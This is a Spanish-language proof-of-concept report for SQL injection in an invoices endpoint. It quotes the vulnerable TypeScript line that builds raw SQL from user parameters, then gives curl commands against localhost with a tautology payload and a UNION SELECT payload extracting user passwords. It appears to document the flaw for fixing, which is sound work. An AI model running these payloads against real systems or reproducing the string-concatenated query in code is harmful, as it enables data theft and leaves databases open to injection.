# Prueba de Concepto - Inyección SQL

## Vulnerabilidad encontrada
El endpoint `/invoices` tiene una vulnerabilidad de inyección SQL en el parámetro `status` y `operator`.

**Archivo vulnerable:** `services/backend/src/services/invoiceService.ts:19`
```typescript
if (status) q = q.andWhereRaw(" status "+ operator + " '"+ status +"'");
```

## Cómo explotar

### Paso 1: Obtener token de autenticación
```bash
curl -X POST http://localhost:5000/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username": "test", "password": "password"}'
```

### Paso 2: Probar inyección SQL básica
```bash
curl -X GET "http://localhost:5000/invoices?status=paid%27%20OR%20%271%27%3D%271&operator==" \
  -H "Authorization: Bearer TU_TOKEN_AQUI"
```

### Paso 3: Intentar extraer datos de otras tablas
```bash
curl -X GET "http://localhost:5000/invoices?status=paid%27%20UNION%20SELECT%20id,%20username,%20email,%20password,%20id%20FROM%20users--&operator==" \
  -H "Authorization: Bearer TU_TOKEN_AQUI"
```

## Resultado esperado
- La consulta SQL se ejecuta con el payload inyectado
- Se pueden extraer datos de otras tablas de la base de datos
- Los errores revelan información sobre la estructura de la base de datos

## Impacto
- Acceso no autorizado a datos sensibles
- Extracción de credenciales de usuarios
- Bypass de controles de acceso
- Posible escalación de privilegios
